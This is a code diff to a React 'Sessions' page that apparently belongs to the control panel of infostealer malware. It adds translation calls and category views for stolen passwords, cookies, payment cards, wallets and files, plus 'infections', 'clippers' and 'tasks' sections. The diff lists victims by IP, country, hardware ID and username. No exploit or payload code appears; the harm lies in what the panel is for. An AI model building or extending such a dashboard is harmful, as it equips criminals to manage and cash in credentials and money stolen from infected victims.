@@ -1,7 +1,7 @@
 import { useState, useMemo, useEffect } from 'react'
-import { useNavigate } from 'react-router-dom'
+import { useNavigate, useLocation } from 'react-router-dom'
 import { useQuery, keepPreviousData } from '@tanstack/react-query'
-import { t } from '@/lib/i18n'
+import { useI18n } from '@/lib/i18n'
 import {
   useTable,
   tableFeatures,
@@ -43,25 +43,6 @@ const features = tableFeatures({
 type F = typeof features
 const columnHelper = createColumnHelper<F, SessionListItem>()
 
-const COUNTRY_OPTIONS = [
-  { value: '', label: 'All countries' },
-  { value: 'RU', label: 'Russia' },
-  { value: 'US', label: 'United States' },
-  { value: 'BR', label: 'Brazil' },
-  { value: 'IN', label: 'India' },
-  { value: 'DE', label: 'Germany' },
-  { value: 'GB', label: 'United Kingdom' },
-  { value: 'FR', label: 'France' },
-  { value: 'CN', label: 'China' },
-]
-
-const DATE_PRESETS = [
-  { value: '', label: 'All time' },
-  { value: 'today', label: 'Today' },
-  { value: 'yesterday', label: 'Yesterday' },
-  { value: '7d', label: 'Last 7 days' },
-  { value: '30d', label: 'Last 30 days' },
-]
 
 function getDateRange(preset: string): { from?: string; to?: string } {
   const now = new Date()
@@ -90,6 +71,32 @@ function getDateRange(preset: string): { from?: string; to?: string } {
 
 export default function Sessions() {
   const navigate = useNavigate()
+  const location = useLocation()
+  const { t } = useI18n()
+
+  const COUNTRY_OPTIONS = [
+    { value: '', label: t('sessions.all_countries') },
+    { value: 'RU', label: 'Russia' },
+    { value: 'US', label: 'United States' },
+    { value: 'BR', label: 'Brazil' },
+    { value: 'IN', label: 'India' },
+    { value: 'DE', label: 'Germany' },
+    { value: 'GB', label: 'United Kingdom' },
+    { value: 'FR', label: 'France' },
+    { value: 'CN', label: 'China' },
+  ]
+
+  const DATE_PRESETS = [
+    { value: '', label: t('sessions.all_time') },
+    { value: 'today', label: t('sessions.today') },
+    { value: 'yesterday', label: t('sessions.yesterday') },
+    { value: '7d', label: t('sessions.last_7d') },
+    { value: '30d', label: t('sessions.last_30d') },
+  ]
+  const pathSegment = location.pathname.split('/').filter(Boolean)[0] || ''
+  const category = pathSegment
+  const isComingSoon = category === 'clippers' || category === 'tasks'
+  const apiType = ({ passwords: 'password', cookies: 'cookie', cards: 'card', wallets: 'wallet', files: 'file' } as Record<string, string>)[category] ?? ''
   const [search, setSearch] = useState('')
   const [debouncedSearch, setDebouncedSearch] = useState('')
   const [countryFilter, setCountryFilter] = useState('')
@@ -120,12 +127,12 @@ export default function Sessions() {
 
   useEffect(() => {
     setPagination(prev => ({ ...prev, pageIndex: 0 }))
-  }, [sort, countryFilter, debouncedSearch, datePreset, emptyOnly])
+  }, [sort, countryFilter, debouncedSearch, datePreset, emptyOnly, apiType])
 
   const dateRange = useMemo(() => getDateRange(datePreset), [datePreset])
 
   const query = useQuery<SessionPage>({
-    queryKey: ['sessions', pagination.pageIndex + 1, pagination.pageSize, sort, debouncedSearch, countryFilter, datePreset, emptyOnly],
+    queryKey: ['sessions', pagination.pageIndex + 1, pagination.pageSize, sort, debouncedSearch, countryFilter, datePreset, emptyOnly, apiType],
     queryFn: () => api.get<SessionPage>('/api/sessions', {
       page: pagination.pageIndex + 1,
       limit: pagination.pageSize,
@@ -135,6 +142,7 @@ export default function Sessions() {
       date_from: dateRange.from,
       date_to: dateRange.to,
       empty_only: emptyOnly || undefined,
+      type: apiType || undefined,
     }),
     placeholderData: keepPreviousData,
   })
@@ -154,7 +162,7 @@ export default function Sessions() {
           className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
           onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
         >
-          IP {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
+          {t('table.ip')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
         </div>
       ),
       enableSorting: true,
@@ -165,7 +173,7 @@ export default function Sessions() {
     }),
     columnHelper.accessor('country_code', {
       id: 'country',
-      header: 'Country',
+      header: t('table.country'),
       enableSorting: true,
       cell: ({ getValue }) => {
         const v = getValue()
@@ -184,15 +192,15 @@ export default function Sessions() {
           className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
           onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
         >
-          OS {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
+          {t('table.os')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
         </div>
       ),
       enableSorting: true,
     }),
-    columnHelper.accessor('username', { id: 'username', header: 'Username' }),
+    columnHelper.accessor('username', { id: 'username', header: t('table.username') }),
     columnHelper.accessor('hwid', {
       id: 'hwid',
-      header: 'HWID',
+      header: t('table.hwid'),
       cell: ({ getValue }) => {
         const v = getValue()
         return v ? <span className="font-mono text-xs">{v.slice(0, 16)}…</span> : '-'
@@ -205,7 +213,7 @@ export default function Sessions() {
           className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
           onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
         >
-          Passwords {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
+          {t('session.passwords')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
         </div>
       ),
       enableSorting: true,
@@ -217,7 +225,7 @@ export default function Sessions() {
           className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
           onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
         >
-          Cookies {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
+          {t('session.cookies')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
         </div>
       ),
       enableSorting: true,
@@ -229,7 +237,7 @@ export default function Sessions() {
           className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
           onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
         >
-          Cards {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
+          {t('session.cards')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
         </div>
       ),
       enableSorting: true,
@@ -241,7 +249,7 @@ export default function Sessions() {
           className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
           onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
         >
-          Wallets {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
+          {t('session.wallets')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
         </div>
       ),
       enableSorting: true,
@@ -253,7 +261,7 @@ export default function Sessions() {
           className="flex items-center gap-1 cursor-pointer select-none hover:text-foreground"
           onClick={(e) => header.column.getToggleSortingHandler()?.(e)}
         >
-          Created {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
+          {t('common.created')} {header.column.getIsSorted() === 'asc' ? '↑' : header.column.getIsSorted() === 'desc' ? '↓' : ''}
         </div>
       ),
       enableSorting: true,
@@ -276,7 +284,7 @@ export default function Sessions() {
 
   const table = useTable({
     features,
-    data: data?.items ?? [],
+    data: data?.sessions ?? [],
     columns: visibleCols,
     state: { sorting, pagination },
     onSortingChange: setSorting,
@@ -287,10 +295,21 @@ export default function Sessions() {
     rowCount: data?.total ?? 0,
   })
 
+  if (isComingSoon) {
+    return (
+      <div className="space-y-4">
+        <h1 className="text-2xl font-semibold tracking-tight">{t(`nav.${category}` as any)}</h1>
+        <div className="flex flex-col items-center justify-center h-[40vh] gap-4">
+          <p className="text-lg text-muted-foreground">This feature is coming soon</p>
+        </div>
+      </div>
+    )
+  }
+
   return (
     <div className="space-y-4">
       <div className="flex items-center justify-between">
-        <h1 className="text-2xl font-semibold tracking-tight">{t('sessions.title')}</h1>
+        <h1 className="text-2xl font-semibold tracking-tight">{(['passwords','cookies','cards','wallets','files','infections','clippers','tasks'] as string[]).includes(category) ? t(`nav.${category}` as any) : t('sessions.title')}</h1>
         <div className="flex items-center gap-2">
           <select
             value={datePreset}
@@ -325,7 +344,7 @@ export default function Sessions() {
             onClick={() => setEmptyOnly(!emptyOnly)}
             className={emptyOnly ? 'bg-primary/10' : ''}
           >
-            {emptyOnly ? 'Show all' : 'Hide empty'}
+            {emptyOnly ? t('sessions.show_all') : t('sessions.hide_empty')}
           </Button>
           <Button
             variant="outline"
@@ -342,7 +361,7 @@ export default function Sessions() {
               </Button>
             </DropdownMenuTrigger>
             <DropdownMenuContent align="end" className="w-44">
-              <DropdownMenuLabel>Columns</DropdownMenuLabel>
+              <DropdownMenuLabel>{t('sessions.columns')}</DropdownMenuLabel>
               <DropdownMenuSeparator />
               {Object.entries(visibleColumns).map(([key, visible]) => (
                 <DropdownMenuItem key={key} onClick={() => toggleColumn(key)}>
@@ -378,7 +397,7 @@ export default function Sessions() {
                 {table.getRowModel().rows.length === 0 ? (
                   <TableRow>
                     <TableCell colSpan={visibleCols.length} className="h-24 text-center text-muted-foreground">
-                      {query.isFetching ? 'Loading...' : 'No sessions found'}
+                      {query.isFetching ? t('common.loading') : t('sessions.no_sessions')}
                     </TableCell>
                   </TableRow>
                 ) : (
@@ -403,8 +422,8 @@ export default function Sessions() {
           <div className="flex items-center justify-between">
             <p className="text-sm text-muted-foreground tabular-nums">
               {data
-                ? `Showing ${data.items.length} of ${data.total.toLocaleString()} sessions`
-                : 'Loading...'}
+                ? t('sessions.showing', { a: data.sessions.length, b: data.total.toLocaleString() })
+                : t('common.loading')}
             </p>
             <div className="flex items-center gap-2">
               <Button
